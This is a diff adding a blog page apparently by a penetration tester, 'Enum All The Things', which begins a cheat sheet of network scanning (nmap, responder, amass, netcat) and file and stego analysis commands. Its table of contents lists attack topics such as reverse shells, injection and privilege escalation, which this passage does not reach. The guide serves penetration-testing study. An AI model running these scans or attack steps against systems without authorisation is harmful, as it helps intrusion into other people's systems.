@@ -1,0 +1,1982 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta name=author content="Ian Ovenell"><meta name=description content="Table of Contents     Table of Contents Recon  File enumeration  Disk files Images Audio   Port 7 - Echo tcp/udp Port 21 - FTP Port 22 - SSH Port 23 - Telnet Port 25 - Telnet Port 43 - WHOIS Port 53 - DNS Port 69 - UDP - TFTP Port 79 - Finger Kerberos - 88 Port 110 - POP3 Port 995 / 110 - POP Port 111 - Rpcbind Port 113 - Ident Port 123 - TNP Port 135 - MSRPC Port 139/445 - SMB Port 143 / 993- IMAP Port 161/162 UDP - SNMP Port - 194,6667,6660-7000 - IRC Port 264 - Check Point FireWall-1 LDAP - 389, 636, 3268, 3269 HTTPS - 443 Port 500 - ISAKMP IPsec/IKE VPN Port 502 - Modbus Port 512 - Rexec Port 513 - Rlogin Port 514 - RSH Port 515 - line printerdaemon LPd Port 541 - FortiNet SSLVPN Port 548 - Apple Filing Protocol (AFP) Port 554 - RTSP Port 623 / UDP / TCP - IPMI Port 631 - Internet Printing Protocol(IPP) Port 873 - Rsync Port 1026 - Rusersd Port 1028 / 1099 - Java RMI Port 1030/1032/1033/1038 MSSQL - 1433 Port 1521 - Oracle Port 1723 - PPTP Port 1883 - MQTT (Mosquitto) Port 2049 - NFS TNS Listener Port 2100 - Oracle XML DB Port 3260 - ISCSI Port 3299 - SAPRouter MySQL - 3306 Port 3339 - Oracle web interface Port 3389 - RDP Port 3632 - distcc Port 4369 - Erlang Port Mapper Daemon (epmd) Port 5353 / UDP - Multicast DNS (mDNS) Port 5432 / 5433 - Postgresql Port 5671 - AMQP Port 5985 / 5986 - WinRM VNC - 5800 / 5801 / 5900 / 5901 - VNC Port 5984 - CouchDB Port 6000 - X11 Port 8009 - Apache JServ Protocol (AJP) MsDeploy - 8172 Webdav Port 9042 / 9160 - Cassandra Port 9100 - Raw Printing (JetDirect, AppSocket, PDL-datastream) Port 9200 - Elasticsearch Port 10000 - Network Data Management Protocol (ndmp) Port 11211 - Memcache Port 15672 - RabbitMQ Management Port 27017 / 27018 - MongoDB Port 44818 / UDP / TCP - EthernetIP Port 47808 / udp - BACNet Port 50030 / 50060 / 50070 / 50075 / 50090 - Hadoop Unknown ports Port 80 - web server  Url Brutforce Default_Weak login LFI-RFI Sql-injection XSS Sql-login Bypass Bypass img Upload   Online crackers   Vulnerability analysis  Buffer Overflow Find xploits - Searchsploit and google Reverse Sells   Privilege escalation  Common  Set up Webserver Set up FTP Server Filet ransfer   Linux  Basic info Kernel exploits Programs running as root Installed software Weak/reused/plaintext passwords Inside service Suid misconfiguration Unmounted filesystems Cronjob SSH Keys Bad path configuration) PS Monitor for cron Linux Privesc Tools Linux Precompiled Exploits   Windows  Basic info Kernel exploits Cleartext passwords Reconfigure service parameters Dump process for passwords Inside service Programs running as root/system Installed software Scheduled tasks Weak passwords Add user and enable RDP Powershell sudo for Windows Windows download with bitsadmin Windows download with certutil."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Enum All The Things"><meta name=twitter:description content="Table of Contents     Table of Contents Recon  File enumeration  Disk files Images Audio   Port 7 - Echo tcp/udp Port 21 - FTP Port 22 - SSH Port 23 - Telnet Port 25 - Telnet Port 43 - WHOIS Port 53 - DNS Port 69 - UDP - TFTP Port 79 - Finger Kerberos - 88 Port 110 - POP3 Port 995 / 110 - POP Port 111 - Rpcbind Port 113 - Ident Port 123 - TNP Port 135 - MSRPC Port 139/445 - SMB Port 143 / 993- IMAP Port 161/162 UDP - SNMP Port - 194,6667,6660-7000 - IRC Port 264 - Check Point FireWall-1 LDAP - 389, 636, 3268, 3269 HTTPS - 443 Port 500 - ISAKMP IPsec/IKE VPN Port 502 - Modbus Port 512 - Rexec Port 513 - Rlogin Port 514 - RSH Port 515 - line printerdaemon LPd Port 541 - FortiNet SSLVPN Port 548 - Apple Filing Protocol (AFP) Port 554 - RTSP Port 623 / UDP / TCP - IPMI Port 631 - Internet Printing Protocol(IPP) Port 873 - Rsync Port 1026 - Rusersd Port 1028 / 1099 - Java RMI Port 1030/1032/1033/1038 MSSQL - 1433 Port 1521 - Oracle Port 1723 - PPTP Port 1883 - MQTT (Mosquitto) Port 2049 - NFS TNS Listener Port 2100 - Oracle XML DB Port 3260 - ISCSI Port 3299 - SAPRouter MySQL - 3306 Port 3339 - Oracle web interface Port 3389 - RDP Port 3632 - distcc Port 4369 - Erlang Port Mapper Daemon (epmd) Port 5353 / UDP - Multicast DNS (mDNS) Port 5432 / 5433 - Postgresql Port 5671 - AMQP Port 5985 / 5986 - WinRM VNC - 5800 / 5801 / 5900 / 5901 - VNC Port 5984 - CouchDB Port 6000 - X11 Port 8009 - Apache JServ Protocol (AJP) MsDeploy - 8172 Webdav Port 9042 / 9160 - Cassandra Port 9100 - Raw Printing (JetDirect, AppSocket, PDL-datastream) Port 9200 - Elasticsearch Port 10000 - Network Data Management Protocol (ndmp) Port 11211 - Memcache Port 15672 - RabbitMQ Management Port 27017 / 27018 - MongoDB Port 44818 / UDP / TCP - EthernetIP Port 47808 / udp - BACNet Port 50030 / 50060 / 50070 / 50075 / 50090 - Hadoop Unknown ports Port 80 - web server  Url Brutforce Default_Weak login LFI-RFI Sql-injection XSS Sql-login Bypass Bypass img Upload   Online crackers   Vulnerability analysis  Buffer Overflow Find xploits - Searchsploit and google Reverse Sells   Privilege escalation  Common  Set up Webserver Set up FTP Server Filet ransfer   Linux  Basic info Kernel exploits Programs running as root Installed software Weak/reused/plaintext passwords Inside service Suid misconfiguration Unmounted filesystems Cronjob SSH Keys Bad path configuration) PS Monitor for cron Linux Privesc Tools Linux Precompiled Exploits   Windows  Basic info Kernel exploits Cleartext passwords Reconfigure service parameters Dump process for passwords Inside service Programs running as root/system Installed software Scheduled tasks Weak passwords Add user and enable RDP Powershell sudo for Windows Windows download with bitsadmin Windows download with certutil."><meta property="og:title" content="Enum All The Things"><meta property="og:description" content="Table of Contents     Table of Contents Recon  File enumeration  Disk files Images Audio   Port 7 - Echo tcp/udp Port 21 - FTP Port 22 - SSH Port 23 - Telnet Port 25 - Telnet Port 43 - WHOIS Port 53 - DNS Port 69 - UDP - TFTP Port 79 - Finger Kerberos - 88 Port 110 - POP3 Port 995 / 110 - POP Port 111 - Rpcbind Port 113 - Ident Port 123 - TNP Port 135 - MSRPC Port 139/445 - SMB Port 143 / 993- IMAP Port 161/162 UDP - SNMP Port - 194,6667,6660-7000 - IRC Port 264 - Check Point FireWall-1 LDAP - 389, 636, 3268, 3269 HTTPS - 443 Port 500 - ISAKMP IPsec/IKE VPN Port 502 - Modbus Port 512 - Rexec Port 513 - Rlogin Port 514 - RSH Port 515 - line printerdaemon LPd Port 541 - FortiNet SSLVPN Port 548 - Apple Filing Protocol (AFP) Port 554 - RTSP Port 623 / UDP / TCP - IPMI Port 631 - Internet Printing Protocol(IPP) Port 873 - Rsync Port 1026 - Rusersd Port 1028 / 1099 - Java RMI Port 1030/1032/1033/1038 MSSQL - 1433 Port 1521 - Oracle Port 1723 - PPTP Port 1883 - MQTT (Mosquitto) Port 2049 - NFS TNS Listener Port 2100 - Oracle XML DB Port 3260 - ISCSI Port 3299 - SAPRouter MySQL - 3306 Port 3339 - Oracle web interface Port 3389 - RDP Port 3632 - distcc Port 4369 - Erlang Port Mapper Daemon (epmd) Port 5353 / UDP - Multicast DNS (mDNS) Port 5432 / 5433 - Postgresql Port 5671 - AMQP Port 5985 / 5986 - WinRM VNC - 5800 / 5801 / 5900 / 5901 - VNC Port 5984 - CouchDB Port 6000 - X11 Port 8009 - Apache JServ Protocol (AJP) MsDeploy - 8172 Webdav Port 9042 / 9160 - Cassandra Port 9100 - Raw Printing (JetDirect, AppSocket, PDL-datastream) Port 9200 - Elasticsearch Port 10000 - Network Data Management Protocol (ndmp) Port 11211 - Memcache Port 15672 - RabbitMQ Management Port 27017 / 27018 - MongoDB Port 44818 / UDP / TCP - EthernetIP Port 47808 / udp - BACNet Port 50030 / 50060 / 50070 / 50075 / 50090 - Hadoop Unknown ports Port 80 - web server  Url Brutforce Default_Weak login LFI-RFI Sql-injection XSS Sql-login Bypass Bypass img Upload   Online crackers   Vulnerability analysis  Buffer Overflow Find xploits - Searchsploit and google Reverse Sells   Privilege escalation  Common  Set up Webserver Set up FTP Server Filet ransfer   Linux  Basic info Kernel exploits Programs running as root Installed software Weak/reused/plaintext passwords Inside service Suid misconfiguration Unmounted filesystems Cronjob SSH Keys Bad path configuration) PS Monitor for cron Linux Privesc Tools Linux Precompiled Exploits   Windows  Basic info Kernel exploits Cleartext passwords Reconfigure service parameters Dump process for passwords Inside service Programs running as root/system Installed software Scheduled tasks Weak passwords Add user and enable RDP Powershell sudo for Windows Windows download with bitsadmin Windows download with certutil."><meta property="og:type" content="article"><meta property="og:url" content="https://ovenell.ninja/notes/enum-all-the-things/"><meta property="article:section" content="notes"><meta property="article:published_time" content="2021-05-31T00:00:00+00:00"><meta property="article:modified_time" content="2021-05-31T00:00:00+00:00"><title>Enum All The Things · Ian Ovenell</title><link rel=canonical href=https://ovenell.ninja/notes/enum-all-the-things/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.93c41bf1e522f85ecda7355985f09000f71fc1d64dda9f74051b0fa06210e93f.css integrity="sha256-k8Qb8eUi+F7NpzVZhfCQAPcfwdZN2p90BRsPoGIQ6T8=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.f37febc669ce189201c1918fac1948a254686c8d366a312c2d72b2bb71ad97d1.css integrity="sha256-83/rxmnOGJIBwZGPrBlIolRobI02ajEsLXKyu3Gtl9E=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><script defer src=https://twemoji.maxcdn.com/v/13.0.2/twemoji.min.js integrity=sha384-wyB/MspSJ/r2bT2kCj44qtsYRYlpzO2oAPhRj5myrWD63dt6qWv4x8AZe7Fl3K3b crossorigin=anonymous></script><meta name=generator content="Hugo 0.83.1"></head><body class="preload-transitions colorscheme-dark" onload=twemoji.parse(document.body)><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Ian Ovenell</a>
+<input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li></ul></section></nav><div class=content><section class="container page"><article><header><h1 class=title><a class=title-link href=https://ovenell.ninja/notes/enum-all-the-things/>Enum All The Things</a></h1></header><p><img src=https://img.shields.io/github/stars/pandao/editor.md.svg alt> <img src=https://img.shields.io/github/forks/pandao/editor.md.svg alt></p><h1 id=table-of-contents>Table of Contents
+<a class=heading-link href=#table-of-contents><i class="fa fa-link" aria-hidden=true></i></a></h1><ul><li><a href=#table-of-contents>Table of Contents</a></li><li><a href=#Recon>Recon</a><ul><li><a href=#File-enumeration>File enumeration</a><ul><li><a href=#Disk-files>Disk files</a></li><li><a href=#Images>Images</a></li><li><a href=#Audio>Audio</a></li></ul></li><li><a href=#Port-7---Echo-tcp/udp>Port 7 - Echo tcp/udp</a></li><li><a href=#Port-21---FTP>Port 21 - FTP</a></li><li><a href=#Port-22---SSH>Port 22 - SSH</a></li><li><a href=#Port-23---Telnet>Port 23 - Telnet</a></li><li><a href=#Port-25--Telnet>Port 25 - Telnet</a></li><li><a href=#Port-43---WHOIS>Port 43 - WHOIS</a></li><li><a href=#Port-53---DNS>Port 53 - DNS</a></li><li><a href=#Port-69---UDP---TFTP>Port 69 - UDP - TFTP</a></li><li><a href=#Port-79---Finger>Port 79 - Finger</a></li><li><a href=#Kerberos---88>Kerberos - 88</a></li><li><a href=#Port-110---POP3>Port 110 - POP3</a></li><li><a href=#Port-995-/-110---POP>Port 995 / 110 - POP</a></li><li><a href=#Port-111---Rpcbind>Port 111 - Rpcbind</a></li><li><a href=#Port-113---Ident>Port 113 - Ident</a></li><li><a href=#Port-123---TNP>Port 123 - TNP</a></li><li><a href=#Port-135---MSRPC>Port 135 - MSRPC</a></li><li><a href=#Port-139/445---SMB>Port 139/445 - SMB</a></li><li><a href=#Port-143-/-993--IMAP>Port 143 / 993- IMAP</a></li><li><a href=#Port-161/162-UDP---NMP>Port 161/162 UDP - SNMP</a></li><li><a href=#Port---194,6667,6660-7000---SIRC>Port - 194,6667,6660-7000 - IRC</a></li><li><a href=#Port-264---Check-Point-FireWall-1>Port 264 - Check Point FireWall-1</a></li><li><a href=#LDAP---389,-636,-3268,-3269>LDAP - 389, 636, 3268, 3269</a></li><li><a href=#HTTPS---443>HTTPS - 443</a></li><li><a href=#Port-500---ISAKMP-IPsec/IKE-VPN>Port 500 - ISAKMP IPsec/IKE VPN</a></li><li><a href=#Port-502-Modbus>Port 502 - Modbus</a></li><li><a href=#Port-512---Rexec>Port 512 - Rexec</a></li><li><a href=#Port-513---Rlogin>Port 513 - Rlogin</a></li><li><a href=#Port-514---RSH>Port 514 - RSH</a></li><li><a href=#Port-515---line-printerdaemon-LPd>Port 515 - line printerdaemon LPd</a></li><li><a href=#541---FortiNet---SLVPN>Port 541 - FortiNet SSLVPN</a></li><li><a href=#Port-548---Apple-Filing-Protocol-(AFP)>Port 548 - Apple Filing Protocol (AFP)</a></li><li><a href=#Port-554---RTSP>Port 554 - RTSP</a></li><li><a href=#Port-623-/-UDP-/-TCP---IPMI>Port 623 / UDP / TCP - IPMI</a></li><li><a href=#Port-631---Internet-Printing-Protocol(IPP)>Port 631 - Internet Printing Protocol(IPP)</a></li><li><a href=#Port-873---Rsync>Port 873 - Rsync</a></li><li><a href=#Port-1026---Rusersd>Port 1026 - Rusersd</a></li><li><a href=#Port-1028-/-1099---Java-RMI>Port 1028 / 1099 - Java RMI</a></li><li><a href=#Port-1030/1032/1033/1038>Port 1030/1032/1033/1038</a></li><li><a href=#MSSQL---1433>MSSQL - 1433</a></li><li><a href=#Port-1521---Oracle>Port 1521 - Oracle</a></li><li><a href=#Port-1723---PPTP>Port 1723 - PPTP</a></li><li><a href=#Port-1883---MQTT title=Mosquitto>Port 1883 - MQTT (Mosquitto)</a></li><li><a href=#Port-2049---NFS-TNS-Listener>Port 2049 - NFS TNS Listener</a></li><li><a href=#Port-2100---Oracle-XML-DB>Port 2100 - Oracle XML DB</a></li><li><a href=#Port-3260---ISCSI>Port 3260 - ISCSI</a></li><li><a href=#Port-3299---SAPRouter>Port 3299 - SAPRouter</a></li><li><a href=#MySQL---3306>MySQL - 3306</a></li><li><a href=#Port-3339---Oracle-web-interface>Port 3339 - Oracle web interface</a></li><li><a href=#Port-3389---RDP>Port 3389 - RDP</a></li><li><a href=#Port-3632---distcc>Port 3632 - distcc</a></li><li><a href=#Port-4369---Erlang-Port-Mapper-Daemon-(epmd)>Port 4369 - Erlang Port Mapper Daemon (epmd)</a></li><li><a href=#Port-5353-/-UDP---Multicast-DNS-(mDNS)>Port 5353 / UDP - Multicast DNS (mDNS)</a></li><li><a href=#Port-5432-/-5433----Postgresql>Port 5432 / 5433 - Postgresql</a></li><li><a href=#Port-5671---AMQP>Port 5671 - AMQP</a></li><li><a href=#Port-5985-/-5986---WinRM>Port 5985 / 5986 - WinRM</a></li><li><a href=#VNC---5800-/-5801-/-5900-/-5901----VNC>VNC - 5800 / 5801 / 5900 / 5901 - VNC</a></li><li><a href=#Port-5984---CouchDB>Port 5984 - CouchDB</a></li><li><a href=#Port-6000---X11>Port 6000 - X11</a></li><li><a href=#Port-8009---Apache-JServ-Protocol-(AJP)>Port 8009 - Apache JServ Protocol (AJP)</a></li><li><a href=#MsDeploy---8172>MsDeploy - 8172</a></li><li><a href=#Webdav>Webdav</a></li><li><a href=#Port-9042-/-9160---Cassandra>Port 9042 / 9160 - Cassandra</a></li><li><a href=#Port-9100---Raw-Printing-(JetDirect,-AppSocket,-PDL-datastream)>Port 9100 - Raw Printing (JetDirect, AppSocket, PDL-datastream)</a></li><li><a href=#Port-9200---Elasticsearch>Port 9200 - Elasticsearch</a></li><li><a href=#Port--10000---Network-Data-Management-Protocol-(ndmp)>Port 10000 - Network Data Management Protocol (ndmp)</a></li><li><a href=#Port-11211---Memcache>Port 11211 - Memcache</a></li><li><a href=#Port-15672---RabbitMQ-Management>Port 15672 - RabbitMQ Management</a></li><li><a href=#Port-27017-/-27018---MongoDB>Port 27017 / 27018 - MongoDB</a></li><li><a href=#Port-44818-/-UDP-/-TCP---EthernetIP>Port 44818 / UDP / TCP - EthernetIP</a></li><li><a href=#Port-47808-/-udp---BACNet>Port 47808 / udp - BACNet</a></li><li><a href=#Port-50030-/-50060-/-50070-/-50075-/-50090---Hadoop>Port 50030 / 50060 / 50070 / 50075 / 50090 - Hadoop</a></li><li><a href=#Unknown-ports>Unknown ports</a></li><li><a href=#Port-80---web-server>Port 80 - web server</a><ul><li><a href=#Url-Brutforce>Url Brutforce</a></li><li><a href=#Default_Weak-login>Default_Weak login</a></li><li><a href=#LFI-RFI>LFI-RFI</a></li><li><a href=#Sql-injection>Sql-injection</a></li><li><a href=#XSS>XSS</a></li><li><a href=#Sql-login-Bypass>Sql-login Bypass</a></li><li><a href=#Bypass-img-Upload>Bypass img Upload</a></li></ul></li><li><a href=#Onlin-rackers>Online crackers</a></li></ul></li><li><a href=#Vulnerability-analysis>Vulnerability analysis</a><ul><li><a href=#Buffer-Overflow>Buffer Overflow</a></li><li><a href=#Find-xploits---Searchsploit-and-google>Find xploits - Searchsploit and google</a></li><li><a href=#Reverse-Sells>Reverse Sells</a></li></ul></li><li><a href=#Privilege-escalation>Privilege escalation</a><ul><li><a href=#Common>Common</a><ul><li><a href=#Set-up-Webserver>Set up Webserver</a></li><li><a href=#Set-up-FTP-Server>Set up FTP Server</a></li><li><a href=#Filet-ransfer>Filet ransfer</a></li></ul></li><li><a href=#Linux>Linux</a><ul><li><a href=#Basic-info>Basic info</a></li><li><a href=#Kernel-exploits>Kernel exploits</a></li><li><a href=#Programs-running-as-root>Programs running as root</a></li><li><a href=#Installed-software>Installed software</a></li><li><a href=#Weak/reused/plaintext-passwords>Weak/reused/plaintext passwords</a></li><li><a href=#Inside-service>Inside service</a></li><li><a href=#Suid-misconfiguration>Suid misconfiguration</a></li><li><a href=#Unmounted-filesystems>Unmounted filesystems</a></li><li><a href=#Cronjob>Cronjob</a></li><li><a href=#SSH-Keys>SSH Keys</a></li><li><a href=#Bad-path-configuration>Bad path configuration)</a></li><li><a href=#PS-Monitor-for-cron>PS Monitor for cron</a></li><li><a href=#Linux-Privesc-Tools>Linux Privesc Tools</a></li><li><a href=#Linux-Precompiled-Exploits>Linux Precompiled Exploits</a></li></ul></li><li><a href=#Windows>Windows</a><ul><li><a href=#Basic-info>Basic info</a></li><li><a href=#Kernel-exploits>Kernel exploits</a></li><li><a href=#Cleartext-passwords>Cleartext passwords</a></li><li><a href=#Reconfigure-service-parameters>Reconfigure service parameters</a></li><li><a href=#Dump-process-for-passwords>Dump process for passwords</a></li><li><a href=#Inside-service>Inside service</a></li><li><a href=#Programs-running-as-root/system>Programs running as root/system</a></li><li><a href=#Installed-software>Installed software</a></li><li><a href=#Scheduled-tasks>Scheduled tasks</a></li><li><a href=#Weak-passwords>Weak passwords</a></li><li><a href=#Add-user-and-enable-RDP>Add user and enable RDP</a></li><li><a href=#Powershell-sudo-for-Windows>Powershell sudo for Windows</a></li><li><a href=#Windows-download-with-bitsadmin>Windows download with bitsadmin</a></li><li><a href=#Windows-download-with-certutil.exe>Windows download with certutil.exe</a></li><li><a href=#Creating-a-wget-VB-Script-on-Windows>Creating a wget VB Script on Windows</a></li><li><a href=#Windows-download-with-powershell>Windows download with powershell</a></li><li><a href=#Windows-Download-from-FTP>Windows Download from FTP</a></li><li><a href=#Windows-create-SMB-Server-transfer-files>Windows create SMB Server transfer files</a></li><li><a href=#Pass-The-Hash>Pass The Hash</a></li><li><a href=#Scripts>Scripts</a><ul><li><a href=#Useradd>Useradd</a></li><li><a href=#Powershell-Run-As>Powershell Run As</a></li><li><a href=#Powershell-Reverse-Shell>Powershell Reverse Shell</a></li></ul></li></ul></li><li><a href=#Loot>Loot</a><ul><li><a href=#Linux>Linux</a><ul><li><a href=#Passwords-and-hashes>Passwords and hashes</a></li><li><a href=#Dualhomed>Dualhomed</a></li><li><a href=#Tcpdump>Tcpdump</a></li><li><a href=#Interesting-files>Interesting files</a></li><li><a href=#Databases>Databases</a></li><li><a href=#SSH-Keys>SSH-Keys</a></li><li><a href=#Browser>Browser</a></li><li><a href=#Mail>Mail</a></li><li><a href=#GUI>GUI</a></li></ul></li><li><a href=#Windows>Windows</a><ul><li><a href=#Passwords-and-hashes>Passwords and hashes</a></li><li><a href=#Dualhomed>Dualhomed</a></li><li><a href=#Tcpdump>Tcpdump</a></li><li><a href=#Interesting-files>Interesting files</a></li></ul></li></ul></li></ul></li></ul><h1 id=recon>Recon
+<a class=heading-link href=#recon><i class="fa fa-link" aria-hidden=true></i></a></h1><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumerate subnet</span>
+nmap -sn 10.10.10.1/24
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Fast simple scan</span>
+nmap -sS 10.10.10.1/24
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#fff;font-weight:700>export</span> IP=10.10.10.11
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Extracting Live IPs from Nmap Scan</span>
+nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep <span style=color:#0ff;font-weight:700>&#34;/open&#34;</span> | cut -d <span style=color:#0ff;font-weight:700>&#34; &#34;</span> -f <span style=color:#ff0;font-weight:700>2</span> &gt; exposed-services-ips
+
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Full complete slow scan with output</span>
+nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full $IP
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Autorecon</span>
+python3 autorecon.py $IP
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Scan for UDP</span>
+nmap $IP -sU
+unicornscan -mU -v -I $IP
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback># Connect to udp if one is open
+nc -u $IP 48772
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback># Responder
+responder -I eth0 -A
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback># Amass
+amass enum $IP
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Generating nice scan report</span>
+nmap -sV IP_ADDRESS -oX scan.xml &amp;&amp; xsltproc scan.xml -o <span style=color:#0ff;font-weight:700>&#34;`date +%m%d%y`_report.html&#34;</span>
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f>#Simple Port Knocking</span>
+<span style=color:#fff;font-weight:700>for</span> x in <span style=color:#ff0;font-weight:700>7000</span> <span style=color:#ff0;font-weight:700>8000</span> 9000; <span style=color:#fff;font-weight:700>do</span> nmap -Pn –host_timeout <span style=color:#ff0;font-weight:700>201</span> –max-retries <span style=color:#ff0;font-weight:700>0</span> -p $x 1.1.1.1; <span style=color:#fff;font-weight:700>done</span>
+</code></pre></div><h2 id=file-enumeration->File enumeration :
+<a class=heading-link href=#file-enumeration-><i class="fa fa-link" aria-hidden=true></i></a></h2><h3 id=common->Common :
+<a class=heading-link href=#common-><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Check real file type</span>
+file file.xxx
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Analyze strings</span>
+strings file.xxx
+strings -a -n <span style=color:#ff0;font-weight:700>15</span> file.xxx <span style=color:#007f7f># Check the entire file and outputs strings longer than 15 chars</span>
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Check embedded files</span>
+binwalk file.xxx <span style=color:#007f7f># Check</span>
+binwalk -e file.xxx <span style=color:#007f7f># Extract</span>
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Check as binary file in hex</span>
+ghex file.xxx
+
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Check metadata</span>
+exiftool file.xxx
+
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f># Stego tool for multiple formats</span>
+wget https://embeddedsw.net/zip/OpenPuff_release.zip
+unzip OpenPuff_release.zip -d ./OpenPuff
+wine OpenPuff/OpenPuff_release/OpenPuff.exe
+
+</code></pre></div><h3 id=disk-files>Disk files
+<a class=heading-link href=#disk-files><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f># guestmount can mount any kind of disk file</span>
+sudo apt-get install libguestfs-tools
+guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
+
+</code></pre></div><h3 id=images>Images
+<a class=heading-link href=#images><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f>#Stego</span>
+wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
+chmod +x stegsolve.jar
+java -jar stegsolve.jar
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f># Stegpy</span>
+stegpy -p file.png
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f># Check png corrupted</span>
+pngcheck -v image.jpeg
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f># Check what kind of image is</span>
+identify -verbose image.jpeg
+</code></pre></div><h3 id=audio>Audio
+<a class=heading-link href=#audio><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f># Check spectrogram</span>
+wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
+dpkg -i sonic-visualiser_4.0_amd64.deb
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f>#AudioStego</span>
+hideme stego.mp3 -f &amp;&amp; cat output.txt
+</code></pre></div><h2 id=port-7---echo-tcpudp>Port 7 - Echo tcp/udp
+<a class=heading-link href=#port-7---echo-tcpudp><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Contact Echo service (UDP)</span>
+nc -uvn $IP <span style=color:#ff0;font-weight:700>7</span>
+Hello <span style=color:#fff;font-weight:700>echo</span>    <span style=color:#007f7f>#This is wat you send</span>
+Hello <span style=color:#fff;font-weight:700>echo</span>    <span style=color:#007f7f>#This is the response</span>
+</code></pre></div><p>References :
